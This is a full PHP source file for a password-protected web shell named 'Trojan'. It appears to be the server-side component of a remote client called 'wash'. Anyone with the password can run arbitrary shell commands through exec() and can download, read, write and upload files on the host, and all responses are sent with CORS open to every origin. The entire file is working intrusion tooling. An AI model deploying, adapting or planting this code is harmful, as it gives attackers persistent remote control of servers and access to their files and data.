<?php

class Trojan{
    private $cwd      = '';
    private $response = array( /*
        error  = '',
        output = array(
            'cwd'    => '',
            'error'  => '',
            'stdout' => '',
        ),
    */);

    /**
     * A generic constructor
     */
    public function __construct($request){
        # emulate cwd persistence
        $this->cwd = ($request['args']['cwd'] != '') ? $request['args']['cwd'] : trim(`pwd`);
    }

    /**
     * Processes commands sent from the wash client
     *
     * @param string $json             JSON from the wash client
     */
    public function process_command($json){
        # verify that the method exists before attempting to invoke it
        # metaprogramming FTW
        if(method_exists($this, $json['action'])){
            $this->$json['action']($json['args']);
        }
        # if the method doesn't exist, send back an error message
        else {
            $this->response['error'] = "{$json['action']} unsupported.";
            $this->send_response();
        }
    }

    /**
     * Processes a command from the wash client
     *
     * @param string $command          A command - this will change
     * @bug: When redirecting output to a file, errors are not reported to the 
     * shell. This happens because stderr is being directed to stdout, which is 
     * in turn being redirected into a file. If the error that was to be 
     * reported was that the redirect file could not be created, however, 
     * output just goes to a black hole. @see Github issue #38.
     */
    private function shell($args){
        /* @note: In order to get current directory persistence to work, I need 
         * to inject some `cd` and `pwd` commands around the command sent from 
         * the wash client. */
        $output_raw = array();
        $command    = $args['cmd'];
        exec("cd {$this->cwd}; $command 2>&1; pwd", $output_raw);

        # buffer the results
        $this->response['output']['cwd']    = $this->cwd = array_pop($output_raw);
        $this->response['output']['stdout'] = join($output_raw, "\n");

        # send the response
        $this->send_response();
    }

    /**
     * Sends a response back to the wash client
     */
    private function send_response(){
        /* This header prevents the wash client from malfunctioning due to the 
         * Same-Origin Policy. @see: http://enable-cors.org/ */
        $this->response['output']['prompt'] = $this->get_prompt_context();
        header('Access-Control-Allow-Origin: *');

        # assemble and send a JSON-encoded response
        echo json_encode($this->response);
        die();
    }

    /**
     * Assembles the prompt context to return to the wash client
     *
     * @return string $prompt_context  The prompt context
     */
    private function get_prompt_context(){
        $whoami               =  trim(`whoami`);
        $hostname             =  gethostname();
        $line_terminator      =  ($whoami ==  'root') ? '#' : '$' ;
        return "{$whoami}@{$hostname}:{$this->cwd}{$line_terminator}";
    }

    

/**
 * Downloads a file
 *
 * @param string $args             Arguments passed from the wash client
 */
public function payload_feh($args){
    # emulate directory persistence
    chdir($this->cwd);

    # if the requested file exists, serve it up to the user
    if(file_exists($args['file'])){
        # extract some image information
        $image_data = getimagesize($args['file']);
        header("Content-Type: {$image_data['mime']}");
        readfile($args['file']);
    }
    
    # if not, provide a notification
    else { echo "File does not exist."; }
    die();
}



/**
 * Downloads a file
 *
 * @param string $args             Arguments passed from the wash client
 */
public function payload_file_down($args){
    # emulate directory persistence
    chdir($this->cwd);
    # if the requested file exists, serve it up to the user
    if(file_exists($args['file'])){
        header('Content-Disposition: attachment; filename='.basename($args['file']));
        header('Content-Transfer-Encoding: binary');
        readfile($args['file']);
    }
    
    # if not, provide a notification
    else { echo "File does not exist."; }
    die();
}

/**
 * Edits a file on the server
 */
public function payload_file_read($args){
    # cd to the appropriate directory
    chdir($this->cwd);

    # Verify that file is readable. 
    if(!is_readable($args['file'])){
        $this->response['error'] = 'File is not readable or does not exist.';
    } else {
        # double-up on the output here
        $this->response['output'] = array(
            # echo back the contents of the file
            'output' => file_get_contents($args['file']),
            # also pass back the absolute path to the file being read
            'file'   => realpath($args['file']),
        );
    }
    $this->send_response();
}

/**
 * Uploads files to the target server
 */
public function payload_file_up($args){
    # cd to the appropriate directory
    chdir($this->cwd);

    foreach ($_FILES["files_up"]["error"] as $key => $error) {
        if ($error == UPLOAD_ERR_OK) {
            $tmp_name = $_FILES["files_up"]["tmp_name"][$key];
            $name     = $_FILES["files_up"]["name"][$key];
            $result = move_uploaded_file($tmp_name, "./$name");
        }
    }

    die(($result) ? "success" : "failure");
}

/**
 * Writes a file to the server
 */
public function payload_file_write($args){
    # cd to the appropriate directory
    chdir($this->cwd);

    # Attempt to write the file, and notify the user of the result. Again,
    # I'm combining several error checks here just to keep the trojan small.
    if(!file_put_contents($args['file'], $args['data'])){
        $this->response['error'] = 'Failed. File may not be writable, or may not exist.';
    }
    else {
        $this->response['output'] = 'Write successful.';
    }
    $this->send_response();
}



}

/* ---------- Procedural code starts here ---------- */

# only process the command if a valid password has been specified
if(sha1($_REQUEST['args']['password'] . '7474b1554c') == '8bc32f6888c6794980bc31c1890a95a7538c5a63'){ 
    $trojan = new Trojan($_REQUEST);
    $trojan->process_command($_REQUEST);
}

# otherwise, just spit back an error message
else { 
    header('Access-Control-Allow-Origin: *');
    die('{"error":"Invalid password."}');
}
